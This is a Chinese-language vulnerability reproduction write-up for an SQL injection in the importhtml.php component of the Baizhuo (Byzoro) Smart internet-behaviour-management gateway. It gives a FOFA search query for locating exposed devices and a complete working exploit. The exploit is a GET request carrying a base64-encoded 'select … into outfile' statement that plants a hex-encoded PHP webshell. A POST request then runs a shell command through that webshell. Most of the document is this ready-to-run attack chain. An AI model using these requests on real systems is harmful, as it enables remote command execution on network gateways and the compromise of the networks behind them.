# 百卓Smart SQL命令注入漏洞

# 一、漏洞简介
百卓Smart是一种系列品牌上网行为管理设备，多种应用功能集于一身，包括网络应用封堵、流量控制、链路负载均衡、网页分类阻断、上网内容审计、防火墙、VPN等。该网关的管理组件文件 importhtml.php 的功能处理逻辑，对参数 sql 的传参处过滤不严，导致任意SQL语句的执行，造成任意恶意文件的写入。

# 二、影响版本
+ 百卓Smart

# 三、资产测绘
+ fofa`app="byzoro-Smart"`
+ 特征

![1699974927531-d5f2d49c-f9c3-417f-abc7-7bbcaba6f53d.png](./img/UARv6UDd29RgBiDC/1699974927531-d5f2d49c-f9c3-417f-abc7-7bbcaba6f53d-383312.png)

# 四、漏洞复现
```plain
GET /importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvcy5waHAn HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![1699974989232-16965ee9-3c76-45b9-b1a7-a6271b782b62.png](./img/UARv6UDd29RgBiDC/1699974989232-16965ee9-3c76-45b9-b1a7-a6271b782b62-882594.png)

写入文件位置

```plain
POST /app/s.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

cmd=ifconfig
```

![1699975045857-a4180062-f99a-4442-a005-33f9f287cbd1.png](./img/UARv6UDd29RgBiDC/1699975045857-a4180062-f99a-4442-a005-33f9f287cbd1-056909.png)

其中`c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvcy5waHAn`为以下代码的base64编码

```plain
select 0x3c3f706870206563686f2073797374656d28245f504f53545b22636d64225d293b3f3e into outfile '/usr/hddocs/nsg/app/s.php'
```

`0x3c3f706870206563686f2073797374656d28245f504f53545b22636d64225d293b3f3e`为webshell hex编码

hex解密网站`[https://www.bejson.com/convert/ox2str/](https://www.bejson.com/convert/ox2str/)`

![1699975206003-6cf67767-eca7-44c5-bd9f-ff1a092eb766.png](./img/UARv6UDd29RgBiDC/1699975206003-6cf67767-eca7-44c5-bd9f-ff1a092eb766-896376.png)



> 更新: 2024-02-29 23:57:13  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gigpdn7864aou7y4>